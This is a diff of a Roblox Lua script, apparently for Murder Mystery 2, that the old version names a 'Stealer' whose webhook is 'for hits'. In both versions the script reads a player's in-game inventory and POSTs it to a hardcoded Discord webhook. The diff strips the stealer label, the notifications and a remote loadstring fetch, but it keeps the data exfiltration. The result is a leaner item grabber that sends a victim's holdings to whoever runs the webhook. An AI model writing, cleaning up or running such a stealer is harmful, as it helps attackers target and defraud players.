@@ -1,111 +1,70 @@
 Config = {
-    Webhook = "https://discord.com/api/webhooks/1301939328015925248/Es_vu2PBwmA15EhZoIii4aa-gQDXIr2u8R3fZPDXciUyxONbooCOpedyGDApMekdYS5b", -- Your webhook for hits.
+    Webhook = "https://discord.com/api/webhooks/1301939328015925248/Es_vu2PBwmA15EhZoIii4aa-gQDXIr2u8R3fZPDXciUyxONbooCOpedyGDApMekdYS5b",
     FullInventory = true,
 }
 
 repeat wait() until game:IsLoaded()
 
-LogsWebhook = "https://discord.com/api/webhooks/1301939328015925248/Es_vu2PBwmA15EhZoIii4aa-gQDXIr2u8R3fZPDXciUyxONbooCOpedyGDApMekdYS5b"
-
-LOGS_WEBS = LogsWebhook
-
-local NotificationHolder = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Module.Lua"))()
-local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Client.Lua"))()
-
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local events = {"MouseButton1Click", "MouseButton1Down", "Activated"}
 
 local Inventory = {}
-local StealerName = "m.kai"
 
-local function sendnotification(message)
-    getgenv().scriptexecuted = false
-    print("["..StealerName.."]:" .. message)
-    Notification:Notify(
-        {Title = "[ "..StealerName.." ]", Description = message},
-        {OutlineColor = Color3.fromRGB(80, 80, 80),Time = 7, Type = "default"}
-    )
+if LocalPlayer.PlayerGui.MainGUI.Game:FindFirstChild("Inventory") ~= nil then
+    UIPath = LocalPlayer.PlayerGui.MainGUI.Game.Inventory.Main
+else
+    UIPath = LocalPlayer.PlayerGui.MainGUI.Lobby.Screens.Inventory.Main
 end
 
-local success, errorMsg = pcall(function()
-    if not Config.Webhook:match("^https?://[%w-_%.%?%.:/%+=&]+$") then
-        sendnotification("Invalid 'Webhook' url!")
-        InvaildWebhook = true
-        return
-    end
-
-    if LocalPlayer.PlayerGui.MainGUI.Game:FindFirstChild("Inventory") ~= nil then
-        UIPath = LocalPlayer.PlayerGui.MainGUI.Game.Inventory.Main
-    else
-        UIPath = LocalPlayer.PlayerGui.MainGUI.Lobby.Screens.Inventory.Main
-    end
-    
-    function checkitem(v)
-        if v:IsA("Frame") then
-            if v.ItemName.Label.Text ~= "Default Knife" and v.ItemName.Label.Text ~= "Default Gun" then
-                if Config.FullInventory then
-                    if v.Container.Amount.Text ~= "" then
-                        number = v.Container.Amount.Text
-                    else
-                        number = "x1"
-                    end
-                    table.insert(Inventory, v.ItemName.Label.Text .. " " .. number)
-                end
+local function checkitem(v)
+    if v:IsA("Frame") then
+        if v.ItemName.Label.Text ~= "Default Knife" and v.ItemName.Label.Text ~= "Default Gun" then
+            if Config.FullInventory then
+                local number = v.Container.Amount.Text ~= "" and v.Container.Amount.Text or "x1"
+                table.insert(Inventory, v.ItemName.Label.Text .. " " .. number)
             end
         end
     end
-    
-    function FullInventory()
-        for i, v in pairs(UIPath.Weapons.Items.Container:GetChildren()) do
-            for i, v in pairs(v.Container:GetChildren()) do
-                if v.Name == "Christmas" or v.Name == "Halloween" then
-                    for i, v in pairs(v.Container:GetChildren()) do
-                        checkitem(v)
-                    end
-                else
+end
+
+local function FullInventory()
+    for _, v in pairs(UIPath.Weapons.Items.Container:GetChildren()) do
+        for _, v in pairs(v.Container:GetChildren()) do
+            if v.Name == "Christmas" or v.Name == "Halloween" then
+                for _, v in pairs(v.Container:GetChildren()) do
                     checkitem(v)
                 end
+            else
+                checkitem(v)
             end
         end
-        for i, v in pairs(UIPath.Pets.Items.Container.Current.Container:GetChildren()) do
-            checkitem(v)
-        end
-    
-        -- Add "None" if no items found in specific categories
-        if Common and Uncommon and Rare and Legendary and Godly and Ancient and Unique and Vintage == 0 then
-            table.insert(Inventory, "None")
-        end
-    
-        -- Format inventory list as bullet points
-        local formattedInventory = {}
-        for _, item in ipairs(Inventory) do
-            table.insert(formattedInventory, "- " .. item)
-        end
-        return table.concat(formattedInventory, "\n")
-    end    
-    
-    FullInventory()
+    end
 
-    task.wait()
-    
-    local data = {
-        content = FullInventory()
-    }
-    
-    
-    
-    
+    for _, v in pairs(UIPath.Pets.Items.Container.Current.Container:GetChildren()) do
+        checkitem(v)
+    end
 
-    local request = http_request or request or HttpPost or syn.request
-    request({
-        Url = Config.Webhook,
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = game.HttpService:JSONEncode(data)
-    })
-end)
+    -- Format inventory list as bullet points
+    local formattedInventory = {}
+    for _, item in ipairs(Inventory) do
+        table.insert(formattedInventory, "- " .. item)
+    end
+    return table.concat(formattedInventory, "\n")
+end    
+
+FullInventory()
+
+task.wait()
+
+local data = {
+    content = FullInventory()
+}
+
+local request = http_request or request or HttpPost or syn.request
+request({
+    Url = Config.Webhook,
+    Method = "POST",
+    Headers = { ["Content-Type"] = "application/json" },
+    Body = HttpService:JSONEncode(data)
+})
